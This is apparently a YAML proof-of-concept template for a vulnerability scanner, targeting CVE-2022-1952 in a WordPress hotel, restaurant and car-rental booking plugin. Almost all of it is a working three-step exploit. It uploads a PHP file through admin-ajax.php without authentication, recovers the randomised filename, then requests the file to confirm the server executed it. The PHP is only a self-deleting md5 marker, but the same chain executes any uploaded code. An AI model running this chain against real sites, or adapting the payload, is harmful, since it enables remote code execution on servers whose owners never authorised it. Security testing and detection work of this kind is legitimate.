name: yaml-poc-syntactics-free_booking_plugin_for_hotels\,_restaurant_and_car_rental-logical-CVE-2022-1952
binding: e74b1249-19cb-4c26-bc44-c46a78c958e8
detail:
    author: jiapeng.han
    links:
        - https://cxsecurity.com/cveshow/CVE-2022-1952/
        - https://nvd.nist.gov/vuln/detail/CVE-2022-1952
        - https://wpscan.com/vulnerability/ecf61d17-8b07-4cb6-93a8-64c2c4fbbe04
    vulnerability:
        id: aca862e8-3a5d-490c-91f3-c43566104414
        level: critical
    warning: File Upload
transport: http
set:
    rboundary: randomLowercase(8)
    randstr: randomLowercase(8)
    randnum: randomLowercase(20)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /wp-admin/admin-ajax.php
            headers:
                Content-Type: multipart/form-data; boundary=------------------------{{rboundary}}
            body: "--------------------------{{rboundary}}\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\neasync_session_store\r\n--------------------------{{rboundary}}\r\nContent-Disposition: form-data; name=\"type\"\r\n\r\ncar\r\n--------------------------{{rboundary}}\r\nContent-Disposition: form-data; name=\"with_driver\"\r\n\r\nself-driven\r\n--------------------------{{rboundary}}\r\nContent-Disposition: form-data; name=\"driver_license_image2\"; filename=\"{{randstr}}.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo md5('{{randnum}}'); unlink(__FILE__);?> \r\n--------------------------{{rboundary}}--\r\n"
            follow_redirects: false
        expression: response.body_string.contains('success":true')
    r1:
        request:
            cache: true
            method: GET
            path: /wp-admin/admin-ajax.php?action=easync_success_and_save
            follow_redirects: false
        expression: response.status == 200
        output:
            filename: '"(?P<filename>[a-zA-Z0-9]{32}\\.php)".bsubmatch(response.body)["filename"]'
    r2:
        request:
            cache: true
            method: GET
            path: /wp-content/uploads/{{filename}}
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains(md5(randnum)) && response.content_type.contains("text/html")
expression: r0() && r1() && r2()
